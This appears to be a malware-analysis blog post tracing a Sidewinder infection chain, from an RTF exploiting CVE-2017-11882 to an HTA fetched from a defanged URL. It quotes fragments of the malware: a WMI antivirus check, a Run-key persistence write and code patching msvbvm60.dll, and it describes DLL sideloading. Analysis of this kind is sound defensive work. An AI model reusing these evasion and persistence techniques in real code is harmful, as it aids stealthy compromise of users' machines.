A new RTF (9001056791a03ec998f26805d462bc2ca336b2c3aeac2e210f73ff841dfe3eec) has just been discovered and it’s the same toolset that is used to create their exploit. The RTF exploits CVE-2017–11882 to dowload a file HTA on hxxp://webservredir.net/includes/b7199e61/-1/5272/fdbfcfc1/final using mshtmll.dll and RunHTMLApplication and records that in caller.exe. Sidewinder gives up the powershell in the HTA and all stuff is written in vbs. The goal of this change is to be more furtive. Many malware used Powershell and many papers describe how to log correctly the execution of powershell. The HTA file checks with WMI the Antivirus Installed and send the informations on the C2. var objWMIService = GetObject(“winmgmts:\\\\.\\root\\SecurityCenter2”); var colItems = objWMIService.ExecQuery(“Select * From AntiVirusProduct”, null, 48); var objItem = new Enumerator(colItems).f the AV are installed, the script is stopped. The chains infections has changed a bit. In the HTA file, there is a zip file. In the zipfile, there are an exe nammed FinalBot.exe. The file become Srvstr.exe in the directory: ExtractTo=din&”\Srvstr\dat” The backdoor has a persistance in the run key. oShell.RegWrite(“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSrv”, pz, “REG_SZ”); And the backoor is launched like that: The HTA File decodes cmpbk32.dll whith two file hj.txt in \Srvstr\dat and call cmd.exe after copying in \Srvstr\dat. the cmd.exe uses cmpbk32.dll by sideloding. And in the entrypoint of the dll, cmpbk32.dll calls fn_0x10001000 for using WinExec to execute Srvstr.exe FFFFFFFF00001498 .The backdoor has developped in VB and used the 8EBECD7C.dll (msvbvm60.dll modified). data = readBinary(win&”\system32\msvbvm60.dll”) data = Replace(data,”__vba”,”__zbc”) writeBinary data,ExtractTo&”\8EBECD7C.dll”